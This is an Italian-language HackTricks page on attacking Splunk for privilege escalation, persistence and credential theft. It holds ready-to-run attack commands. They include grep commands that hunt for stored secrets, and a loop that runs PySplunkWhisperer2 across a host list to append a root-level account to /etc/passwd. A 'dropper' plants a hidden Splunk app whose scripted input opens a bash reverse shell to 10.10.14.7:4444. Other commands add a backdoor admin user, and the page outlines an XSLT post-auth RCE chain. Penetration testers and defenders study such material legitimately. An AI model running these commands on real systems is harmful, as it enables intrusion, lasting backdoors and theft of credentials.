# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

Se **enumerando** una macchina **internamente** o **esternamente** trovi **Splunk in esecuzione** (di solito **8000** per la web UI e **8089** per la management API), credenziali valide possono spesso essere trasformate in **code execution** tramite installazione di app, scripted inputs o azioni di management. Se Splunk è in esecuzione come **root**, questo spesso diventa un immediato **privilege escalation**.

Se ti serve solo la generic remote attack surface, enumeration, o il percorso RCE tramite app-upload, controlla:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Se sei **già root** e il servizio Splunk non ascolta solo su localhost, puoi anche rubare **Splunk password hashes**, recuperare **encrypted secrets**, o caricare una **malicious app** per mantenere persistence localmente o su più forwarders.

## Interesting Local Files

Quando arrivi su un host che esegue Splunk o Splunk Universal Forwarder, questi sono di solito i path più interessanti:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Artifact importanti:

- **`$SPLUNK_HOME/etc/passwd`**: utenti Splunk locali e hash delle password.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: chiave usata da Splunk per cifrare i secret memorizzati in diversi file `.conf`.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: file iniziale di bootstrap dell’admin; utile in gold image e in errori di provisioning. Viene ignorato se `etc/passwd` esiste già.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: dove gli scripted inputs sono comunemente abilitati.
- **`$SPLUNK_HOME/etc/deployment-apps/`** o **`$SPLUNK_HOME/etc/apps/`**: buoni posti per nascondere una app persistente o rivedere cosa viene già distribuito.

## Riassunto dell’exploit Splunk Universal Forwarder Agent

Per ulteriori dettagli, vedi [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Questo è solo un riassunto:

**Panoramica dell’exploit:**
Un exploit che prende di mira il Splunk Universal Forwarder (UF) consente agli attacker con la **agent password** di eseguire codice arbitrario sui sistemi che eseguono l’agent, compromettendo potenzialmente una grande parte dell’ambiente.

**Perché funziona:**

- Il servizio di management dell’UF è comunemente esposto su **TCP 8089**.
- Gli attacker possono autenticarsi all’API e istruggere al forwarder di installare un **malicious app bundle**.
- Lo stesso primitive può essere usato localmente per **LPE** o da remoto per **RCE**.
- Tooling pubblico come **SplunkWhisperer2** crea automaticamente l’app bundle e può adattare i payload per target Linux.

**Modi comuni per recuperare la password:**

- Credenziali in chiaro in documentazione, script, share o automazione di deployment.
- Hash delle password dentro `$SPLUNK_HOME/etc/passwd` seguito da cracking offline.
- Golden image o residui di provisioning come `user-seed.conf`.

**Impatto:**

- Esecuzione di codice a livello SYSTEM/root su ogni host compromesso.
- Distribuzione di app persistenti, backdoor o ransomware.
- Disabilitazione o manomissione della telemetria prima che i dati vengano inoltrati.

**Esempio di comando per l’exploit:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploit pubblici utilizzabili:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence tramite Scripted Inputs o App Malevole

Se hai **filesystem write access** come `root`/`splunk`, oppure accesso autenticato per installare app, un meccanismo di persistence molto affidabile consiste nel depositare una **custom app** con un **scripted input**. La documentazione di Splunk prevede che i scripted inputs risiedano sotto una directory dell'app e vengano abilitati da `inputs.conf`.

Layout tipico:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimal `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Quick Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notes:

- Lo stesso trucco funziona su **Universal Forwarder** usando `/opt/splunkforwarder/etc/apps/`.
- Gli attacker spesso si mimetizzano modificando un add-on legittimo invece di creare un'app ovviamente malicious.
- Su un **deployment server**, piazzare un'app malicious dentro `deployment-apps/` si trasforma in **fleet-wide persistence** perché i forwarder fanno polling, scaricano app aggiornate e spesso si riavviano per applicarle.

## Credential Theft and Admin Takeover

Se puoi leggere i file locali di Splunk, di solito ci sono due buoni obiettivi: recuperare l'accesso **Splunk admin** e recuperare **encrypted service credentials**.

### Password hashes and local users

Splunk memorizza i dati di autenticazione locali in `etc/passwd`. A seconda del deployment, fare cracking di quel file può recuperare credenziali funzionanti per la web UI e la management API.

Se hai già credenziali **admin** valide e Splunk usa il suo backend di autenticazione **native**, la CLI stessa può essere usata per persistence:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` e valori crittografati

Splunk usa `etc/auth/splunk.secret` per proteggere valori sensibili archiviati in più file di configurazione. Se riesci a rubare sia il **secret** sia i relativi file **`.conf`**, spesso puoi recuperare o riutilizzare:

- secret condivisi tra forwarder/indexer come `pass4SymmKey`
- password di chiavi private TLS come `sslPassword`
- credenziali LDAP bind come `bindDNPassword`

Questo è utile per il **lateral movement** anche quando la password admin di Splunk non è crackabile.

### abuso di `user-seed.conf`

`user-seed.conf` viene usato solo al primo avvio o quando `etc/passwd` non esiste. Questo lo rende meno utile su un sistema già attivo, ma molto interessante in:

- template di installazione compromessi
- container images
- workflow di provisioning unattended
- appliance dove Splunk viene reinizializzato automaticamente

In questi casi, inserire un `HASHED_PASSWORD` generato con `splunk hash-passwd` ti offre un modo silenzioso per riottenere accesso admin dopo il redeployment.

## Abusing Splunk Queries

For further details check [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).

Una tecnica recente utile è abusare dell'**XSLT fornito dall'utente** in versioni vulnerabili di Splunk Enterprise per trasformare un account autenticato a basso privilegio in **esecuzione di comandi OS** come utente `splunk`.

Flusso ad alto livello:

1. Autenticarsi a Splunk.
2. Caricare un file **XSL** malevolo tramite la funzionalità di preview/upload.
3. Far renderizzare a Splunk i risultati della ricerca con quel foglio di stile caricato dalla directory **dispatch**.
4. Usare il payload XSLT per scrivere un file o attivare l'esecuzione tramite la pipeline di search di Splunk (per esempio raggiungendo funzionalità interne come `runshellscript`).

Il takeaway offensivo importante è che questo percorso è **post-auth RCE senza bisogno di app upload**. Su Linux in genere ti fa finire nell'account **`splunk`**, che è comunque prezioso perché spesso possiede l'albero dell'applicazione, può leggere segreti e può piazzare app persistenti che sopravvivono alla perdita della shell.

Un percorso rappresentativo usato durante l'exploitation è:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Se Splunk è in esecuzione con troppi privilegi, o se l'utente `splunk` ha accesso a script pericolosi, service unit scrivibili, o regole `sudo` sbagliate, questo diventa una catena pulita di **LPE**.

## References

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
